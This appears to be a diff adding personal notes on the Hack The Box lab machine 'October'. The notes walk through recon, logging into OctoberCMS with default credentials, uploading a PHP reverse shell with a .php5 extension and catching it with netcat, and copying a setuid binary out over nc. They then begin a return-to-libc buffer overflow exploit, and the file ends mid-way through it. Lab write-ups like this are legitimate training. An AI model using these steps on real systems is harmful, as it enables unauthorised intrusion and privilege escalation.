@@ -1,0 +1,321 @@
+>nmap -sV -sC -oA nmap 10.10.10.16
+See that it's listening on 80 and 22
+Browsing to http://10.10.10.16:80 we the application OctoberCMS 
+In the bottom left we also see the copyright year is 2017
+>searchsploit october
+CMS 1.0.412 - Multiple Vulnerabilities php/webapps/41936.txt
+Viewing the exploit in Exploit DB web page we can see the date is 2017-04-25 which means it may be vulnerable
+
+Possible exploits include:
+PHP Upload protection bypass -  Authenticated Users
+Apache .htaccess upload -  Authenticated Users
+Stored WCI in image name -  Authenticated Users
+PHP code execution via asset management -  Authenticated Users
+...
+All exploits appear to require some form of authentication therefore we need to gain a user account
+Clicking on View Forums in the main web page we see that it is using Vanilla Forumns
+Searching for exploits relating to Vanilla Forums we find exploit:
+Vanilla Forums < 2.3 Remote Code Execution
+
+In order to verify the exploit, google 'Vanilla Forum download' to download its source since it is open source
+
+Browsing to the download location for the latest version takes us to:
+https://open.vanillaforums.com/get/vanilla-core-2.3.1
+
+Copy the link location of the source download link for 2.3.1:
+https://us.v-cdn.net/5018160/uploads/addons/2ZCYQN977HZZ.zip
+
+But we want version 2.3.0 so changing the url of the web page to:
+wget https://open.vanillaforums.com/get/vanilla-core-2.3
+
+We can now copy the link location of the source download link for version 2.3.0:
+https://us.v-cdn.net/5018160/uploads/addons/J48X62QECRY1.zip
+
+On kali, create a directory to save the both zip files of the source
+>mkdir vanilla
+>cd vanilla
+
+Download the zip for each version
+>wget https://us.v-cdn.net/5018160/uploads/addons/2ZCYQN977HZZ.zip
+>wget https://us.v-cdn.net/5018160/uploads/addons/J48X62QECRY1.zip
+
+Verify the files are indeed different by running:
+>md5sum *
+
+Create two more subdirectories, one for each version of the source:
+>mkdir 3.0
+>mkdir 3.1
+
+Unzip the contents of each into their respective folders:
+>cd 3.0
+>unzip ../J48X62QECRY1.zip
+>cd ../3.1
+>unzip ../2ZCYQN977HZZ.zip
+
+Can remove the zips in the vanilla folder now:
+>cd ..
+>rm *.zip
+
+Want to run md5 checksums on every single file to see what files changed specifically since the exclusive change made
+between versions was the security vulnerability patch.
+
+>cd vanilla
+>find . -type f -exec md5sum {} \;
+
+Since the versions will contain 3.0 and 3.1 in all their paths this will show us essentially everything as different. Therefore
+we can narrow the result set by removing '.1.' and '.0'
+
+>find . -type f -exec md5sum {} \; | sed 's/\.[01]//g'
+
+Now we can sort and count by unique
+
+>find . -type f -exec md5sum {} \; | sed 's/\.[01]//g' | sort | uniq -c
+Or can put into a file
+>find . -type f -exec md5sum {} \; | sed 's/\.[01]//g' > hashes
+Sort and count number of uniques
+>sort hashes | uniq -c
+Sort in reverse  order
+>sort hashes | uniq -c | sort -nr
+
+A lot of differences however a lot are php files and since we can't see the source code of php files we can exclude them
+>sort hashes | grep -v php$ | uniq -c | sort -nr
+
+As a result we see that only four files whose hashes have changes. They are:
+<hash> ./3/README.md
+<hash> ./3/vendor/composer/LICENSE
+<hash> ./3/README.md
+<hash> ./3/vendor/composer/LICENSE
+
+Try and access the readmes:
+http://10.10.10.16/forum/README.md
+http://10.10.10.16/README.md
+
+We find that composer doesn't expose the files so we cannot glean any information from this.
+However this technique is extremely useful for checking differences in javascript files across versions
+
+Researching for OctoberCMS admin login, or running dirb agasint it, we find the login url is:
+http://10.10.10.16/backend/backend/auth/signing
+
+Logging in with admin / admin we get in
+Now all the CVE's from above will work
+Trying the file upload exploit, Click Media > Upload. We are taken to:
+http://10.10.10.16/backend/cms/media
+
+The exploit is that we can upload files with extension .php5
+So we upload the default kali linux /usr/share/webshells/php/php-reverse-shell.php but with extension .php5
+(be sure to edit the %ip and note the $port parameter)
+
+Once uploaded, set up a listener on port $port
+>nc nlvp 4444
+
+Execute the webshell by clicking the link "click here" for public url
+>whoami
+Shows that we are www-data on the October box
+
+Running linuxpriv-checker reveals a file with the setuid (sticky) bit set but we can also find it
+>find / -perm -4000 2>/dev/null
+
+The sticky bit allows a program to switch its privileges to the context of the owner of the file when executed. i.e. sudo.
+When sudo is executed as a lower-priv'd user, it's able to escalate its permissions to that of the owner (root). Thus finding
+a program which has the sticky bit set and is also exploitable to some form of code/command injection will ultimately allow 
+us to spawn a process (i.e. /bin/sh) as root.
+
+The find results yield an interesting binary located in:
+/usr/local/bin/overflow
+
+This is notable because it does not seem like a native or typical executable. It is also the only one in the /usr/local/bin
+Send it back to kali so first, on kali, set up a listener that will redirect data to a file
+>nc -nlvp -p 999 > overflw
+
+Then on October pass the file into nc:
+>nc -w 5 <kali ip> -p 999 < /usr/local/bin/overflw
+
+Run a checksum on it on both machines to ensure data integrity:
+>md5sum overflw
+
+Check the version of October:
+>uname -a
+Linux October 4.4.0-78-generic #99-14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 i686 GNU/Linux
+
+So October is a 32-bit Ubuntu machine and our Kali is 64 bit. And is a different OS
+
+On October:
+>cat /etc/lsb-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=14.04
+DISTRIB_CODENAME=trusty
+DISTRIB_DESCRIPTION="Ubuntu 14.04.5 LTS"
+
+Since we now doing exploit dev, we want to replicate the target host as closely as possible. Sowe need to set up
+an Ubunut host.
+
+
+==Exploit dev - Getting Root==
+
+Download the overflw binary to our local Ubuntu machine
+Verify checksum
+>md5sum overflow
+
+Make it executable
+>chmod +x overflow
+
+Execute it
+>./overflow
+Syntax: ./overflow <input string>
+
+So we know it accepts one argument and it's a string as 
+>./overflow aaa
+This executes without issue and also does nothing
+Fuzzing it we do
+>./overflow `python -c 'print "A"*200'` <-- (note the backtick surrounding the command)
+Segmentation fault (core dumped)
+
+So we get a segfault which indicates an overflow which means we can try to develop a buffer overflow exploit for the
+binary
+
+To assist with Exploit Dev on Ubuntu, install peda.py for gdb
+Once installed, start debugging the binary to see how it works
+>gdb ./overflw
+$b main
+Breakpoint 1 at 0xB84848B
+$r
+Breakpoint 1, 0xB84848B in main ()
+$r `python -c 'print "A"*200'`
+$c
+Stopped reason: $IGSEGV
+0x41414141 in?? ()
+$quit
+>python -c 'print "\x41"'
+A
+
+So we crashed the program by overwriting the stack with four A chars.
+Still on our local Ubuntu check the security measures by attaching GDB to the binaryt again:
+>gdb ./overflw
+$checksec
+CANARY: disabled
+FORTIFY: disabled
+NX: ENABLED
+PIE: disabled
+RELRO: Partial
+
+NX being enabled means that DEP is enabled
+Going back to our reverse shell to October on the Kali box convert shell to PTY
+In the reverse shell:
+>python -c 'import pty;pty.spawn("/bin/bash");'
+>Ctrl+Z
+Back in Kali shell:
+>stty raw -echo
+>nc -nlvp 4444
+Reverse shell to October should come back and we should have PTY features
+Back in reverse shell now
+>cd /usr/local/bin
+>ldd overflow | grep libc
+  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75fd000)
+
+Continuously running:
+>ldd overflow | grep libc
+Will show us that the address of libc constantly changes every time meaning ASLR is enabled
+
+Perform the same check on our local Ubuntu host. If it is, then as root,disable it for now for the sake of developing 
+the exploit
+>echo 0 > /proc/sys/kernel/randomize_va_space
+
+Rerun the check to make sure the address no longer changes by running below command several times
+>ldd overflow | grep libc
+
+Now we need to identify where the buffer overflow actually occrs. So back in Kali, create a unique string of length 200
+>msf-pattern_create -l 200
+
+Copy the complete unique string it creates and go back to local Ubuntu machine
+>gdb ./overflw
+$r <full unique string here>
+Stopped reason: SIGSEV
+0x64413764
+
+So we crash at address 0x64413764 and note that our EIP register is pointing to that address. Find the offset:
+>msf-pattern_offset -q 64413764 
+[*] Exact match at offset 112
+
+So our overflow starts overwriting the EIP register at 112 bytes
+Back on our local Ubuntu machine, start constructing our python script
+Create simply python script to build a buffer of 112 bytes, and then insert 4 distinct bytes (0xd3adc0d3 in this case)
+>vi buf.py
+
+import struct
+buf = "A" * 112
+buf += struct.pack("<I", 0xd3adc0d3)
+
+print buf
+
+>gdb overflow
+$r `python buf.py`
+Stopped reason: SIGSEV
+0xd3adc0d3 in ?? ()
+$exit
+
+So we've demonstrated that we can crash the overflw binary and can reliably overwrite EIP with our own bytes and thus start
+controlling code execution
+
+Because of DEP protection we can't just drop in shellcode and execute it. But we can drop the memory location to the system 
+syscall in linux, and have that pointed to a string which we control or found, to execute the code. Therefore we're not actually
+executing code off the stack that we injected- we're just making an instruction appear out of thin air. We need to implement 
+a method known as: "return to libc". We will start by writing a simple program in c.
+
+>vi retlib.c
+
+#include <stdlib.h>
+
+void main() {
+  system("/bin/sh");
+  }
+ >escWQ!
+ 
+ Compile it
+ >gcc retlib.c -o retlibc
+ >gdb ./retlibc 
+ $ b main
+ Breakpoint 1 at 0x8048420
+ $r
+ Starting program /home/klaus/Desktop/retlibc
+ 
+ Looking at the instructions in the code section, note:
+ => 0x8048426 <main+9>: mov DWORD PTR [esp],0x80484d0
+ This address (80484d0) shoud be our /bin/sh. Check by running
+ $x/s 0x80484d0
+ 0x80484d0 "/bin/sh"
+ 
+ So all that instruction is doing is moving the address (0x80484d0) into ESP which is the top of the stack
+ Take one step in gdb
+ $si
+ 0x0804842d in main ()
+ 
+ Now note in the stack section of the gdb output that the top contains /bin/sh
+ 000| 0xbffff0f0 --> 0x80484d0 ("/bin/sh")
+ Take one more step
+ $si
+ 0x080482f0 in system@plt ()
+ 
+ Now we have just called system and the exit code has been place at the top of the stack
+ 000| 0xbffff0ec --> 0x804B432 (<main+21>:    leave)
+ 000| 0xbffff0f0 --> 0x80484d0 ("/bin/sh")
+ So 0x804B432 is the address the program will go to after it runs 
+ 
+ 
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
